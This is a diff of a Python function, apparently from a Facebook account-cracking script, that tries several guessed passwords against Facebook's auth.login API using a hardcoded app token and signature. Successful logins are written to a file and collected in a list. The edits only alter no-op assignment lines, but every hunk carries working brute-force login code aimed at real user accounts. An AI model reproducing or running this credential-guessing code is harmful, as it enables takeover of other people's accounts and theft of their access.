@@ -202,7 +202,7 @@ def cemail():
         except OSError:
             pass
         try:
-			pass1 = pass1
+			pass1
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
@@ -219,7 +219,7 @@ def cemail():
 					cps.close()
 					cpb.append(c+user+pass1)
 				else:
-					pass2 = pass2
+					pass2
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 					q = json.load(data)
 					if 'access_token' in q:
@@ -236,7 +236,7 @@ def cemail():
 							cps.close()
 							cpb.append(c+user+pass2)
 						else:
-							pass3 = pass3
+							pass3
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 							q = json.load(data)
 							if 'access_token' in q:
@@ -253,7 +253,7 @@ def cemail():
 									cps.close()
 									cpb.append(c+user+pass3)
 								else:
-									pass4 = pass4
+									pass4
 									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 									q = json.load(data)
 									if 'access_token' in q:
@@ -270,7 +270,7 @@ def cemail():
 											cps.close()
 											cpb.append(c+user+pass4)
 										else:
-											pass5 = pass5
+											pass5
 											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 											q = json.load(data)
 											if 'access_token' in q:
